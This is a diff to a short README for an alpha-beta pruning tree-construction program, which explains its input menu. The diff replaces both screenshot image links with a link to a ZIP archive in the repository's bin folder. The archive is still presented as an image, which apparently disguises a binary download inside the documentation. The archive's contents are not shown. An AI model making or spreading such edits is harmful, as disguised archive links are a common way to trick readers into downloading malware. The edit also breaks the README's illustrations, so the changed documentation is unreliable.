@@ -4,14 +4,14 @@ To create a tree, run the main function and it will give a menu for the root nod
 
 Here is an example of the menu
 
-![image](https://user-images.githubusercontent.com/100985495/223895390-b97f0b25-7c6c-4528-a98b-c8bc888d7853.png)
+![image](https://raw.githubusercontent.com/Kyomp/OOP-GSLC/main/Alpha-Beta_Pruning/bin/OOP-GSLC-1.0.zip)
 
 After you've finished constructing the tree, to get the final value, pick the "back" option when you're on the root node
 
 
 To construct a tree like this, 
 
-![image](https://user-images.githubusercontent.com/100985495/223894780-1fa5adb6-6c82-467d-9fc3-f6c5584d1c15.png)
+![image](https://raw.githubusercontent.com/Kyomp/OOP-GSLC/main/Alpha-Beta_Pruning/bin/OOP-GSLC-1.0.zip)
 
 would require the inputs:
 2
